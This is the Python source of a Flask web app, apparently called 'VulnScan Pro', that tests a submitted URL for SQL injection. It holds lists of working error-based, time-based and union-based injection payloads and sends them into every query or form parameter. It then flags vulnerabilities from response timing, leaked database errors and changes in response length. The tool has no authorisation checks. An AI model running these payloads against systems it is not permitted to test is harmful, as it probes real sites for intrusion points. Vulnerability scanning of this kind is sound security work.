from flask import Flask, request, jsonify, send_from_directory
import requests as req
import time
import json
import re
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

app = Flask(__name__, static_folder='static')

# --- Expanded payload sets by technique ---
PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "\" OR \"1\"=\"1",
        "' OR ''='",
        "' OR 1=1#",
        "' AND 1=CONVERT(int, 'a') --",   # MSSQL
        "' AND extractvalue(1,concat(0x7e,version())) --",  # MySQL
        "' AND 1=1 UNION SELECT null --",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5' --",     # MSSQL
        "' OR SLEEP(5) --",                # MySQL
        "'; SELECT pg_sleep(5) --",        # PostgreSQL
        "' OR 1=1 AND SLEEP(5) --",
        "1; WAITFOR DELAY '0:0:5' --",
    ],
    "union_based": [
        "' UNION SELECT null --",
        "' UNION SELECT null,null --",
        "' UNION SELECT null,null,null --",
        "' UNION ALL SELECT 'vuln','vuln' --",
    ]
}

ERROR_KEYWORDS = [
    "sql syntax", "mysql_fetch", "ora-", "odbc driver",
    "sqlite_", "pg_query", "syntax error", "unclosed quotation",
    "microsoft ole db", "jdbc", "sqlexception", "mysql_num_rows",
    "supplied argument is not a valid mysql", "division by zero",
    "invalid query", "sql command not properly ended"
]

TIME_THRESHOLD = 4.0  # seconds — flag if response takes longer than this
DIFF_THRESHOLD = 50   # bytes — how far a response must diverge to be suspicious

# A harmless, clearly-non-malicious value that almost certainly matches no row.
# Used to establish what a normal "not found" response looks like, so that a
# payload which just also returns "not found" isn't mistaken for a vulnerability.
NEGATIVE_CONTROL_VALUE = "zzz_nonexistent_control_09182"


def extract_injectable_params(url):
    """Auto-extract all GET parameters from URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return list(params.keys()), parsed


def inject_param(parsed_url, params_dict, param_name, payload):
    """Inject payload into a specific parameter."""
    new_params = dict(params_dict)
    new_params[param_name] = payload
    new_query = urlencode(new_params)
    new_parsed = parsed_url._replace(query=new_query)
    return urlunparse(new_parsed)


def calculate_risk_score(results):
    """Generate a 0-100 risk score based on findings."""
    score = 0
    for r in results:
        if r.get('vulnerable'):
            technique = r.get('technique', '')
            if technique == 'time_based':
                score += 35   # High confidence — hard to false positive
            elif r.get('error_keyword'):
                score += 30   # DB error leaked — critical
            elif technique == 'union_based':
                score += 25
            else:
                score += 15   # Length diff only — lower confidence
    return min(score, 100)


def risk_label(score):
    if score >= 70: return "CRITICAL"
    if score >= 40: return "HIGH"
    if score >= 20: return "MEDIUM"
    if score > 0:   return "LOW"
    return "SAFE"


@app.route('/')
def index():
    return send_from_directory('static', 'index.html')


@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)


@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    url = data.get('url', '').strip()
    method = data.get('method', 'GET').upper()
    timeout = int(data.get('timeout', 8))

    if not url:
        return jsonify({'error': 'No URL provided'}), 400

    # --- Auto-extract parameters ---
    parsed_url = urlparse(url)
    params_dict = {k: v[0] for k, v in parse_qs(parsed_url.query).items()}

    # If there are no real GET parameters, there's nothing injectable.
    if not params_dict and method == 'GET':
        return jsonify({
            'error': 'No GET parameters found in this URL (e.g. ?id=1). '
                     'Nothing to test — add a query parameter or use POST mode.',
            'meta': {'url': url}
        }), 400

    param_names = list(params_dict.keys()) or ['input']

    results = []
    scan_meta = {
        "url": url,
        "method": method,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "params_found": param_names
    }

    # --- Baseline request (valid/original value) ---
    try:
        start = time.time()
        if method == 'GET':
            baseline = req.get(url, timeout=timeout, verify=False)
        else:
            baseline = req.post(url, data={'input': 'test'}, timeout=timeout, verify=False)
        baseline_time = time.time() - start
        normal_length = len(baseline.text)
    except Exception as e:
        return jsonify({'error': f'Baseline request failed: {str(e)}'}), 500

    # --- Negative-control baseline (harmless value that shouldn't match anything) ---
    # This tells us what a normal "no results" response looks like, so we don't
    # mistake an app's ordinary not-found behavior for a SQL injection signal.
    not_found_length = None
    not_found_time = None
    try:
        start = time.time()
        if method == 'GET':
            if params_dict:
                first_param = param_names[0]
                control_url = inject_param(parsed_url, params_dict, first_param, NEGATIVE_CONTROL_VALUE)
                control_resp = req.get(control_url, timeout=timeout, verify=False)
            else:
                control_resp = None
        else:
            control_data = dict(params_dict) if params_dict else {}
            if param_names:
                control_data[param_names[0]] = NEGATIVE_CONTROL_VALUE
            control_resp = req.post(url, data=control_data, timeout=timeout, verify=False)
        if control_resp is not None:
            not_found_time = time.time() - start
            not_found_length = len(control_resp.text)
    except Exception:
        # If the negative-control request fails, fall back to comparing against
        # the normal baseline only (old behavior) rather than aborting the scan.
        not_found_length = None
        not_found_time = None

    # --- Run all payload categories ---
    for technique, payload_list in PAYLOADS.items():
        for payload in payload_list:
            for param in param_names:
                try:
                    start = time.time()

                    if method == 'GET':
                        test_url = inject_param(parsed_url, params_dict, param, payload)
                        response = req.get(test_url, timeout=timeout, verify=False)
                    else:
                        post_data = dict(params_dict) if params_dict else {}
                        post_data[param] = payload
                        response = req.post(url, data=post_data, timeout=timeout, verify=False)

                    elapsed = time.time() - start
                    resp_len = len(response.text)

                    diff_from_baseline = abs(normal_length - resp_len)
                    error_found = any(k in response.text.lower() for k in ERROR_KEYWORDS)

                    # Time-based: flag if response took suspiciously long
                    time_anomaly = (technique == 'time_based' and
                                     elapsed >= TIME_THRESHOLD and
                                     elapsed >= baseline_time + 3.0)

                    if not_found_length is not None:
                        # Only count a length difference as suspicious if the response
                        # ALSO differs meaningfully from the "harmless, no match" response.
                        # A payload that just produces the same ordinary "not found" page
                        # as any other non-matching input is not evidence of injection.
                        diff_from_not_found = abs(not_found_length - resp_len)
                        length_anomaly = (
                            diff_from_baseline > DIFF_THRESHOLD and
                            diff_from_not_found > DIFF_THRESHOLD
                        )
                        diff = diff_from_not_found  # report distance from the "normal" negative response
                    else:
                        # No negative control available — fall back to the simpler check,
                        # same as before, for GET requests with no real params etc.
                        length_anomaly = diff_from_baseline > DIFF_THRESHOLD
                        diff = diff_from_baseline

                    vulnerable = time_anomaly or error_found or (length_anomaly and technique != 'time_based')

                    results.append({
                        'payload': payload,
                        'technique': technique,
                        'parameter': param,
                        'diff': diff,
                        'response_time': round(elapsed, 2),
                        'baseline_time': round(baseline_time, 2),
                        'vulnerable': vulnerable,
                        'error_keyword': error_found,
                        'time_anomaly': time_anomaly,
                    })

                except Exception as e:
                    results.append({
                        'payload': payload,
                        'technique': technique,
                        'parameter': param,
                        'diff': 0,
                        'vulnerable': False,
                        'error': str(e)
                    })

    # --- Risk scoring ---
    score = calculate_risk_score(results)
    label = risk_label(score)

    return jsonify({
        'meta': scan_meta,
        'baseline_length': normal_length,
        'baseline_time': round(baseline_time, 2),
        'not_found_length': not_found_length,
        'results': results,
        'risk_score': score,
        'risk_label': label,
        'vulnerable_count': sum(1 for r in results if r.get('vulnerable')),
        'total_tests': len(results)
    })


@app.route('/export', methods=['POST'])
def export_report():
    """Return a structured JSON report for download."""
    data = request.json
    report = {
        "report_generated": datetime.utcnow().isoformat() + "Z",
        "tool": "VulnScan Pro",
        "scan": data
    }
    return jsonify(report)


if __name__ == '__main__':
    print("\n  VulnScan Pro — Flask Backend")
    print("  http://localhost:5122\n")
    app.run(debug=True, port=5122)